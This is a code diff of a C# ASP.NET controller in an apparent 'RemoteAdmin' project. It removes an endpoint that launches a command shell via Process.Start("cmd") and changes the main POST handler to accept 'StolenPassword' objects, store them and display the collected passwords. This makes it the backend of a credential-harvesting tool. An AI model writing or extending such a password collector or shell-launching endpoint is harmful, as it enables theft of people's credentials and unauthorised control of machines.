@@ -11,7 +11,7 @@ namespace RemoteAdmin.Controllers
 {
     public class HomeController : Controller
     {
-        UserButton user;
+
 
         [HttpGet]
         public ViewResult Index()
@@ -20,32 +20,24 @@ namespace RemoteAdmin.Controllers
         }
 
         [HttpPost]
-        public ViewResult Index(UserButton user)
-        {
-            user.isPressed = true;
-            return View("Index");
-        }
-
-        [HttpPost]
-        public ViewResult Privacy()
-        {
-            Process.Start("cmd");
-            return View("Privacy");
-        }
-
-        [HttpGet]
-        public ViewResult Passwords()
-        {
-            return View("Passwords");
-        }
-
-        [HttpPost]
-        public ViewResult Passwords(StolenPassword pass)
+        public ViewResult Index(StolenPassword pass)
         {
             FakeDataBase.AddPassword(pass);
             FakeDataBase.GetDump(pass);
+
+            using(var fb = new FakeDataBase())
+            {
+                fb.Add(pass);
+                fb.SaveChanges();
+            }
+
             return View("ShowPassword", FakeDataBase.GetPasswords);
         }
+
+        
+       
+
+      
 
     }
 }
